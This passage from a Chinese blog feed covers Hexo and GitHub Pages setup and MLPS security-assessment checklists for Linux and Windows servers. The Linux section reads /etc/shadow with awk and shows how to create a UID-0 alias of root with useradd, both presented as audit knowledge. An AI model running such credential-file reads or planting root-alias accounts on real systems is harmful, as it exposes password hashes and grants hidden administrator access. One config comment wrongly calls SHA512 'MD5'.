alt="image-20240629105949089"></p><p>安装依赖：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240629110301526.png" alt="image-20240629110301526"></p><p>启动：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo s</span><br><span class="line">hexo s -p 4001  #如果想在其他端口运行</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240629110417896.png" alt="image-20240629110417896"></p><p><img src="/img/image-20240629110408658.png" alt="image-20240629110408658"></p><h1 id="4-创建github仓库"><a href="#4-创建github仓库" class="headerlink" title="4 创建github仓库"></a>4 创建github仓库</h1><p>仓库名：<code>用户名.github.io</code> </p><h1 id="5-设置ssh秘钥"><a href="#5-设置ssh秘钥" class="headerlink" title="5 设置ssh秘钥"></a>5 设置ssh秘钥</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;github用户名&quot;</span><br><span class="line">git config --global user.email github邮箱</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240629111755960.png" alt="image-20240629111755960"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-t指定要创建的密钥类型。可以使用：rsa1(SSH-1)、rsa(SSH-2)、dsa(SSH-2)</span></span><br><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>一直按回车：</p><p><img src="/img/image-20240629120735444.png" alt="image-20240629120735444"></p><p>记事本打开公钥文件<code>id_rsa.pub</code></p><p><img src="/img/image-20240629120841866.png" alt="image-20240629120841866"></p><p>github登录后点头像——&gt;Settings——&gt;SSH and GPG keys——&gt;New SSH key，粘贴公钥的内容。</p><p>回到gitbash输入以下内容进行验证，第一次执行这个命令需要输入yes。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240629121724167.png" alt="image-20240629121724167"></p><h1 id="6-hexo文章加密插件"><a href="#6-hexo文章加密插件" class="headerlink" title="6 hexo文章加密插件"></a>6 hexo文章加密插件</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure><h1 id="7-安装主题"><a href="#7-安装主题" class="headerlink" title="7 安装主题"></a>7 安装主题</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载主题文件</span></span><br><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装pug 以及 stylus 的渲染器</span></span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><h1 id="8-推送文章"><a href="#8-推送文章" class="headerlink" title="8 推送文章"></a>8 推送文章</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>等保测评：linux系统</title>
      <link href="/2023/12/03/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%EF%BC%9ALinux%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/12/03/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%EF%BC%9ALinux%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-查看系统版本"><a href="#1-查看系统版本" class="headerlink" title="1 查看系统版本"></a>1 查看系统版本</h1><p><strong>命令：cat &#x2F;etc&#x2F;redhat-release &#x2F;etc&#x2F;issue &#x2F;etc&#x2F;lsb-release &#x2F;proc&#x2F;version</strong> </p><h1 id="2-空口令账户"><a href="#2-空口令账户" class="headerlink" title="2 空口令账户"></a>2 空口令账户</h1><p><strong>命令：awk -F: ‘length($2)&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow</strong> </p><p>以有权限的账户身份登录操作系统后，核查系统是否存在空口令账户。<code>/etc/shadow</code>这个文件以冒号分割有九个字段。第一字段为用户名称，第二个字段为该用户加密后的密码，该字段为空即为空口令账户。</p><p>测评结果：不存在空口令账户。</p><h1 id="3-管理员账户"><a href="#3-管理员账户" class="headerlink" title="3 管理员账户"></a>3 管理员账户</h1><p><strong>命令：awk -F: ‘$3&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;passwd</strong> </p><p>应查看UID为0的管理员账户。</p><p>如果要建立一个UID为0的用户：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd zhangsan -o -u 0</span><br></pre></td></tr></table></figure><ul><li>-u [uid]：指定用户id。</li><li>-o：使uid可重复。</li></ul><p>zahngsan实际上还是root用户，只是root的别名用户，系统只认 uid 不认名。</p><h1 id="4-密码有效期"><a href="#4-密码有效期" class="headerlink" title="4 密码有效期"></a>4 密码有效期</h1><p><strong>命令：chage -l root</strong> 查看密码更换周期。</p><p><strong>命令：grep -E “PASS_MAX_DAYS|PASS_MIN_DAYS|PASSMIN_LEN|PASS_WARN_AGE|ENCRYPT_METHOD|UID_MIN” &#x2F;etc&#x2F;login.defs</strong> </p><p>查看<code>/etc/login.defs</code>文件，查看是否设置相应的密码规则。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PASS MAX_DAYS 90      # 登录密码有效期90天</span><br><span class="line">PASS MIN_DAYS 0       # 登录密码最短修改时间，增加可以防止非法用户短期更改多次</span><br><span class="line">PASS MIN_LEN 7        # 登录密码最小长度7位</span><br><span class="line">PASS WARN_AGE 7       # 登录密码过期提前7天提示修改</span><br><span class="line">ENCRYPT_METHOD SHA512 # 表示用户密码加密方式，此处表示用MD5加密密码。</span><br><span class="line">UID_MIN 1000          # 用户ID最小值</span><br></pre></td></tr></table></figure><h1 id="5-密码复杂度"><a href="#5-密码复杂度" class="headerlink" title="5 密码复杂度"></a>5 密码复杂度</h1><p><strong>命令：</strong></p><p><strong>grep -E “minlen|ucredit|lcredit|dcredit|ocredit|deny&#x3D;” &#x2F;etc&#x2F;pam.d&#x2F;system-auth &#x2F;etc&#x2F;pam.d&#x2F;password-auth</strong> （Redhat&#x2F;Centos）</p><p><strong>grep -E “minlen|ucredit|lcredit|dcredit|ocredit|deny&#x3D;” &#x2F;etc&#x2F;pam.d&#x2F;common-auth &#x2F;etc&#x2F;pam.d&#x2F;common-password</strong>（Debian&#x2F;Ubuntu）</p><p>如果<code>/etc/pam.d/system-auth</code>文件里也有与<code>/etc/login.defs</code>文件相同效果的密码规则配置项（比如最小密码长度），则以<code>/etc/pam.d/system-auth</code>里的设置为准，也就是说<code>/etc/pam.d/system-aut</code>的配置优先级高于<code>/etc/login.defs</code>。</p><p><code>/etc/pam.d/system-auth</code>和<code>/etc/pam.d/password-auth</code>都能设置密码复杂度，内容都如同下方代码块所展示。</p><p>RedHat Linux Centos 6-开始，sshd所包含的pam认证文件是password_auth，也就是说<code>/etc/pam.d/sshd</code>会引用<code>/etc/pam.d/password-auth</code>中的密码复杂度配置；而<code>/etc/pam.d/system-auth</code>文件中的密码复杂度配置只适用于tty本地管理。</p><p><img src="/img/20230718141254.png"></p><p>找到<strong>password  requisite  pam_pwquality.so</strong>（CentOS6.x是pam_cracklib.so）行，后面跟着的，都是功能参数，可根据说明，进行相关配置，需要加限制就加选项和值。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">password requisite pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type= minlen=8 minclass=4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;retry=3&quot;</span>，修改密码的时候，可以重试的次数。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;difok=4&quot;</span>，与旧密码不同的字符个数。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;minlen=8&quot;</span>，表示最小密码长度为8。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PAM 提供4种类型符号作为密码（大写字母、小写字母、数字和标点符号）。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果同时用上了这4种类型的符号，并且minlen设为大于6，那么最短的密码长度允许是6个字符。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;ucredit=-1&quot;</span>，表示密码必须至少包含一个大写字母。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;lcredit=-2&quot;</span>，表示密码必须至少包含两个小写字母。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;dcredit=-1&quot;</span>，表示密码必须至少包含一个数字。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;ocredit=-1&quot;</span>，表示密码必须至少包含一个标点符号。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;minclass=4&quot;</span>，表示密码必须至少包含大写字母、小写字母、数字、标点符号四类字符。</span></span><br></pre></td></tr></table></figure><h1 id="6-登录失败处理"><a href="#6-登录失败处理" class="headerlink" title="6 登录失败处理"></a>6 登录失败处理</h1><p><strong>命令：</strong></p><p><strong>grep  -E “deny&#x3D;|unlock” &#x2F;etc&#x2F;pam.d&#x2F;system-auth &#x2F;etc&#x2F;pam.d&#x2F;sshd</strong> （Redhat&#x2F;Centos）</p><p><strong>grep  -E “deny&#x3D;|unlock” &#x2F;etc&#x2F;pam.d&#x2F;common-auth &#x2F;etc&#x2F;pam.d&#x2F;sshd</strong> （Debian&#x2F;Ubuntu）</p><p><strong>服务端</strong> </p><p>使用命令查看是否启用了登录失败处理功能。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">auth required pam_tally2.so onerr=fail deny=3 unlock_time=40 even_deny_root root_unlock_time=30</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">onerr=fail 表示定义了当出现错误时的缺省返回值。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">缺省值：计算机软件系统要求用户输入某些值而用户未给定时，系统自动赋予的事先设定的数值。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以上策略表示：普通帐户和 root 的帐户登录连续 3 次失败，就统一锁定 40 秒， 40 秒后可以解锁。如果不想限制 root 帐户，可以把 even_deny_root root_unlock_time这两个参数去掉， root_unlock_time 表示 root 帐户的锁定时间。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意：用户锁定期间，即使输入正确的密码，也将被视为错误密码，并以最后一次登录为锁定起始时间，若果用户解锁后输入密码的第一次依然为错误密码，则再次重新锁定。</span></span><br><span class="line">account required pam_tally.so deny=3 no_magic_root reset #登录失败三次锁定账户</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意：pam_tally.so是老的版本，从RedHat Linux 6（centos 6)开始，pam_tally2.so是唯一可用的程序。</span></span><br></pre></td></tr></table></figure><p><strong>远程登录</strong> </p><p>上面只是限制了从终端登陆，如果想限制ssh远程的话， 要看的是&#x2F;etc&#x2F;pam.d&#x2F;sshd这个文件，配置规则跟上面一样。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">auth required pam_tally2.so onerr=fail deny=3 unlock_time=40 even_deny_root root_unlock_time=30</span><br></pre></td></tr></table></figure><h1 id="7-登录超时处理"><a href="#7-登录超时处理" class="headerlink" title="7 登录超时处理"></a>7 登录超时处理</h1><p><strong>命令：cat &#x2F;etc&#x2F;profile |grep TMOUT</strong></p><p>查看<code>/etc/profile</code>中的<code>TMOUT</code>环境变量，是否配置超时锁定参数。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export TMOUT= 300 #默认单位为秒。</span><br></pre></td></tr></table></figure><h1 id="8-默认账户"><a href="#8-默认账户" class="headerlink" title="8 默认账户"></a>8 默认账户</h1><p><strong>命令：grep -E “uucp|nuucp|lp|adm|sync|shutdown|halt|news|operator|gopher” &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow</strong> </p><p>Linux操作系统本身安装后提供各种账号，如adm、Ip、sync、shutdown、halt、uucp、operator、gopher、games、mail、ftp等， 但这些账户使用时并不需要，有的帐号越多，就越容易受到攻击，应禁用或者删除这些用户。</p><h1 id="9-信任主机文件"><a href="#9-信任主机文件" class="headerlink" title="9 信任主机文件"></a>9 信任主机文件</h1><p><strong>命令：cat &#x2F;etc&#x2F;hosts.equiv;find &#x2F; -name “.rhost”</strong> </p><p>使用该命令查看是否有信任主机文件（免密登录）。</p><p><code>/etc/hosts.equiv</code> 和 <code>$HOME/.rhosts</code> 定义了哪些计算机和用户可以不用提供口令就在本地计算机上执行远程命令，如 rexec，rcp，rlogin 等等，这些不需要提供口令的计算机和用户称为受信任的。<code>/etc/hosts.equiv</code> 的权限必须设置为只有 root 能够写，建议权限为600。</p><h1 id="10-openssh"><a href="#10-openssh" class="headerlink" title="10 openssh"></a>10 openssh</h1><p><strong>命令：rpm -qa | grep openssh;lsof -i:22;dpkg -l | grep openssh</strong> </p><p>查看是否安装了openssh服务以及是否开启了22端口。</p><p>Telnet协议明文传输，不安全；ssh协议加密传输，安全。</p><h1 id="11-telnet"><a href="#11-telnet" class="headerlink" title="11 telnet"></a>11 telnet</h1><p><strong>命令：rpm -qa | grep telnet;lsof -i:23;dpkg -l | grep telnet</strong> </p><p>查看是否安装了telnet服务以及是否开启了23端口。</p><h1 id="12-vsftpd"><a href="#12-vsftpd" class="headerlink" title="12 vsftpd"></a>12 vsftpd</h1><p><strong>命令：rpm -qa | grep ftp;lsof -i:21;dpkg -l | grep ftp</strong><br>查看是否安装了vsftpd服务以及是否开启了21端口。</p><h1 id="13-日志配置规则"><a href="#13-日志配置规则" class="headerlink" title="13 日志配置规则"></a>13 日志配置规则</h1><p><strong>命令：grep -Ev ‘^$|^#|^$‘ &#x2F;etc&#x2F;syslog.conf &#x2F;etc&#x2F;rsyslog.conf &#x2F;etc&#x2F;rsyslog.d&#x2F;50-default.conf</strong> </p><p>查看日志配置规则。</p><h1 id="14-审计"><a href="#14-审计" class="headerlink" title="14 审计"></a>14 审计</h1><p><strong>命令：auditctl -s;auditctl -l</strong> </p><p>查看审计信息和规则。</p><h1 id="远程管理"><a href="#远程管理" class="headerlink" title="远程管理"></a>远程管理</h1><p>以root身份登录进入Linux查看是否运行了sshd服务，<code>service --status-all |grep sshd</code>（centos7版本： <code>systemctl status sshd</code>）。</p><p>查看相关的端口是否打开，<code>netstat -an|grep 22</code>。</p><p>若未使用SSH方式进行远程管理，则查看是否使用了Telnet 方式进行远程管理<code>service --status-all |grep running</code>（centos7版本：<code>systemctl |grep running</code>）, 查看是否存在Telnet服务。</p><h1 id="多重验证"><a href="#多重验证" class="headerlink" title="多重验证"></a>多重验证</h1><p>要求解读：对于第三级及以上的操作系统要求采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现。</p><p>应访谈和核查系统管理员在登录操作系统的过程中使用了哪些身份鉴别方法，是否采用了两种或两种以上组合的鉴别技术，如口令教字证书Ukey、令牌、指纹等，是否有一种鉴别方法在鉴别过程中使用了密码技术。</p><h1 id="禁止root远程登录"><a href="#禁止root远程登录" class="headerlink" title="禁止root远程登录"></a>禁止root远程登录</h1><p><strong>命令：grep “PermitRootLogin” &#x2F;etc&#x2F;ssh&#x2F;sshd_config</strong> </p><p>root作为重要的默认账户，一般要求禁止远程登录。查看<code>/etc/ssh/sshd_config</code>文件中的<code>PermitRootLogin</code>参数是否设置为<code>no</code>。</p><h1 id="rsyslog与auditd"><a href="#rsyslog与auditd" class="headerlink" title="rsyslog与auditd"></a>rsyslog与auditd</h1><p>rsyslog是一个开源的系统日志管理工具，它可以将日志消息从不同的源(如本地系统、远程系统)收集、处理和转发。audit是个Linux内核中的安全审计子系统，它通过监控系统调用来收集各种信息，包括进程的启动、文件访问、网络连接等。auditct是一个用于控制和管理audit子系统的命令行工具。rsyslog可以用于将audit生成的日志消息收集和处理，并将其发送到其他系统或存储设备。所以rsyslog和audit可以一起使用来提供完整的系统日志管理和安全审计解决方案。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 等保 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>等保测评：Windows系统</title>
      <link href="/2023/12/03/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%EF%BC%9Awindows%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/12/03/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%EF%BC%9Awindows%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p>本篇文章以windows server 2012 R2 为例，三级等保。</p><h1 id="1-身份鉴别"><a href="#1-身份鉴别" class="headerlink" title="1 身份鉴别"></a>1 身份鉴别</h1><h2 id="a-应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换。"><a href="#a-应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换。" class="headerlink" title="a) 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换。"></a>a) 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换。</h2><ol><li>身份标识和鉴别。Win+R组合键打开运行框，输入netplwiz。查看是否勾选了<code>要使用本机，用户必须输入用户名和密码</code> 。</li></ol><p><img src="/img/20230728171819.png"></p><ol start="2"><li>身份标识具有唯一性。默认符合，不存在重复的用户名。</li><li>空口令账户与“密码永不过期”。Win+R组合键打开运行框，输入lusrmgr.msc检查有哪些用户，并尝试空口令登录。然后右键查看每一个账户的属性，是否勾选“密码永不过期”。如果这里勾选了“密码永不过期”，那么windows的密码策略中的“密码最长使用期限”也就失效了。</li></ol><p><img src="/img/20230729095006.png"></p><ol start="4"><li>身份鉴别信息具有复杂度要求并定期更换。Win+R组合键打开运行框，输入secpol.msc查看“账户策略”——&gt;“密码策略”。结果应如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复杂性要求：已启用</span><br><span class="line">密码长度最小值：8</span><br><span class="line">密码最短使用期限：不为0</span><br><span class="line">密码最长使用期限：不为0</span><br><span class="line">强制密码历史：至少记住5个密码以上</span><br></pre></td></tr></table></figure><p><img src="/img/20230729094355.png"></p><h2 id="b-应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施。"><a href="#b-应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施。" class="headerlink" title="b) 应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施。"></a>b) 应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施。</h2><ol><li>应具有登录失败处理功能。Win+R组合键打开运行框，输入secpol.msc查看“账户策略”——&gt;“账户锁定策略”。</li></ol><p><img src="/img/20230729100046.png"></p><ol start="2"><li>超时自动退出。对于本地登录，“控制面板”——&gt;“显示”——&gt;“更改屏幕保护程序”，勾选“在恢复时显示登录屏幕”，设置等待时间不为0分钟，推荐15分钟（根据业务需要）。对于远程登录，Win+R组合键打开运行框，输入gpedit.msc，“计算机配置”——&gt;“管理模板”——&gt;“Windows组件”——&gt;“远程桌面服务”——&gt;“远程桌面会话主机”——&gt;“会话时间限制”——&gt;“设置活动但空闲的远程桌面服务会话时间的限制”，然后启用并设置15分钟。</li></ol><p><img src="/img/20230729100749.png"></p><p><img src="/img/20230729101208.png"></p><h2 id="c-当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听。"><a href="#c-当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听。" class="headerlink" title="c) 当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听。"></a>c) 当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听。</h2><ol><li>运行输入services.msc，查看是否禁用了telnet服务。</li><li>windows Server 2003 SP1中针对远程桌面提供了SSL加密功能，所运行的操作系统必须是windows Server 2003 SP1或其后版本。</li><li>运行输入gpedit.msc，“计算机配置”——&gt;“管理模板”——&gt;“Windows组件”——&gt;“远程桌面服务“——&gt;”远程桌面会话主机“——&gt;”安全“。设置客户端连接加密级别：高级别。远程（RDP）连接要求使用指定的安全层：协商。（选择SSL即会使用SSL协议进行加密；选择协商的话则看客户端是否支持SSL，不支持就使用RDP协议；选择RDP安全层，则使用本机RDP加密。）</li></ol><h2 id="d-应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现。"><a href="#d-应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现。" class="headerlink" title="d)应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现。"></a>d)应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现。</h2><p>此项为双因子认证，其中必须有一项是密码技术。用户名+密码属于是口令方式的认证，密码技术一般使用ukey实现身份认证。</p><h1 id="2-访问控制"><a href="#2-访问控制" class="headerlink" title="2 访问控制"></a>2 访问控制</h1><blockquote><p>a)应对登录的用户分配账户和权限；</p><p>b)应重命名或删除默认账户，修改默认账户的默认口令；</p><p>c)应及时删除或停用多余的、过期的账户，避免共享账户的存在；</p><p>d)应授予管理用户所需的最小权限，实现管理用户的权限分离；</p><p>e)应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则；</p><p>f)访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级；</p><p>g)应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。</p></blockquote><h2 id="a-应对登录的用户分配账户和权限；"><a href="#a-应对登录的用户分配账户和权限；" class="headerlink" title="a) 应对登录的用户分配账户和权限；"></a>a) 应对登录的用户分配账户和权限；</h2><ol><li>管理员应提供权限对照表，查看设置的账户是否与权限表一致。</li><li>运行输入lusrmgr.msc，右键用户查看属于哪个组。</li><li>禁用Guest用户。</li></ol><h2 id="b-应重命名或删除默认账户，修改默认账户的默认口令；"><a href="#b-应重命名或删除默认账户，修改默认账户的默认口令；" class="headerlink" title="b) 应重命名或删除默认账户，修改默认账户的默认口令；"></a>b) 应重命名或删除默认账户，修改默认账户的默认口令；</h2><h1 id="3-安全审计"><a href="#3-安全审计" class="headerlink" title="3 安全审计"></a>3 安全审计</h1><h1 id="4-入侵防范"><a href="#4-入侵防范" class="headerlink" title="4 入侵防范"></a>4 入侵防范</h1><h1 id="5-恶意代码防范"><a href="#5-恶意代码防范" class="headerlink" title="5 恶意代码防范"></a>5 恶意代码防范</h1><h1 id="六、可信验证"><a href="#六、可信验证" class="headerlink" title="六、可信验证"></a>六、可信验证</h1><h2 id="a）可基于可信根对计算设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。"><a href="#a）可基于可信根对计算设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。" class="headerlink" title="a）可基于可信根对计算设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。"></a>a）可基于可信根对计算设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。</h2><p>什么是可信验证？就是当设备加电时，对操作系统、BIOS进行把控，当操作系统被篡改时，能自动报警，未被篡改时不进行报警，可正常启动。</p><p>怎么实现可信验证？可信验证不能单靠测评单位，同时也需要有厂商的支持才能实现。例如对于二级系统，需要在设备主板上镶嵌可信芯片，并在设备上预装有操作系统与常见的应用软件，并通过可信根芯片进行检测与报警。同时操作系统必须进行签名验证，在应用上安装有可信签名证书，相关厂商还需签名背书。</p><p>什么是可信根？国内外可信计算标准都是采用硬件密码芯片来构建可信根。目前，可信根的构建方式大致有如下几种：TCM、TPM、TPCM、密码芯片。</p><ol><li>TCM和TPM：满足可信密码技术要求，可以满足构建可信根的要求。</li><li>TPCM：内部封装了TCM模块，所以也就顺理成章的满足要求。</li><li>密码芯片：不满足可信计算相关的接口、技术规范，所以理论上可以构建可信根，但是无法满足其他功能要求。</li></ol><p>参考：<a href="https://blog.csdn.net/weixin_43055831/article/details/127244785">可信验证与TPCM技术_积微子的博客-CSDN博客</a></p><p>举例：<a href="https://www.httc.com.cn/list/35.html">可信基础硬件 (httc.com.cn)</a></p><p>基本上就没有能满足可信验证的，这几乎就是一个必失分项。</p><h1 id="7-数据完整性"><a href="#7-数据完整性" class="headerlink" title="7 数据完整性"></a>7 数据完整性</h1><h1 id="8-数据保密性"><a href="#8-数据保密性" class="headerlink" title="8 数据保密性"></a>8 数据保密性</h1><h1 id="9-数据备份恢复"><a href="#9-数据备份恢复" class="headerlink" title="9 数据备份恢复"></a>9 数据备份恢复</h1><h1 id="10-剩余信息保护"><a href="#10-剩余信息保护" class="headerlink" title="10 剩余信息保护"></a>10 剩余信息保护</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 等保 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>等保测评：重要业务数据</title>
      <link href="/2023/12/03/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%EF%BC%9A%E9%87%8D%E8%A6%81%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE/"/>
      <url>/2023/12/03/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%EF%BC%9A%E9%87%8D%E8%A6%81%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="一、数据完整性"><a href="#一、数据完整性" class="headerlink" title="一、数据完整性"></a>一、数据完整性</h1><h2 id="a-应采用校验技术或密码技术保证重要数据在传输过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等"><a href="#a-应采用校验技术或密码技术保证重要数据在传输过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等" class="headerlink" title="a)应采用校验技术或密码技术保证重要数据在传输过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等"></a>a)应采用校验技术或密码技术保证重要数据在传输过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等</h2><p>完整性：是指保持信息不被破坏或修改、不丢失和信息未经授权不能改变的特性，也是最基本的安全特征。</p><p>对于B&#x2F;S类型的应用系统来说，一般都是使用HTTPS协议，HTTPS协议同时实现了保密性和完整性。</p><p>而对于C&#x2F;S类型的应用系统来说，如果是直接连接数据库的那种，要看数据库是否配置了SSL，在连接的时候是否使用了SSL。</p><p>以下是指导书内容：</p><p>1、可访谈系统开发人员，询问系统在通信过程中是否采用密码技术(RSA数字签名等算法，加密机、VPN通道等技术)或采用SSL (https)协议传输数据，以保证数据在通信过程中的完整性;</p><p>2、可结合案例验证，如通过获取网络通信数据包，查看通信报文是否含有用于完整性保护的验证信息。比如数据包中含有使用密码技术生成的用于完整性保护的MAC校验信息。</p><p>1和2任一符合即可判定此项符合。</p><h3 id="高风险"><a href="#高风险" class="headerlink" title="高风险"></a>高风险</h3><p>对于三级及以上的系统，数据传输的过程中没有保护措施即为高风险。</p><p><img src="/img/20230808084613.png"></p><p><img src="/img/20230808084726.png"></p><h2 id="b-应采用校验技术或密码技术保证重要数据在存储过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等"><a href="#b-应采用校验技术或密码技术保证重要数据在存储过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等" class="headerlink" title="b)应采用校验技术或密码技术保证重要数据在存储过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等"></a>b)应采用校验技术或密码技术保证重要数据在存储过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等</h2><p>这里要注意和传输过程分开区别，传输过程是一个短暂的、动态的、进行过程，而这里的存储则其实应该理解为长期的保存的过程。</p><p>应用系统中，一般都会将重要的数据存储到数据库当中。应当询问管理员，是否采用了密码技术存储数据，使用了什么加密算法，比如SM4加密算法。</p><h1 id="二、数据保密性"><a href="#二、数据保密性" class="headerlink" title="二、数据保密性"></a>二、数据保密性</h1><h2 id="a）应采用密码技术保证重要数据在传输过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等"><a href="#a）应采用密码技术保证重要数据在传输过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等" class="headerlink" 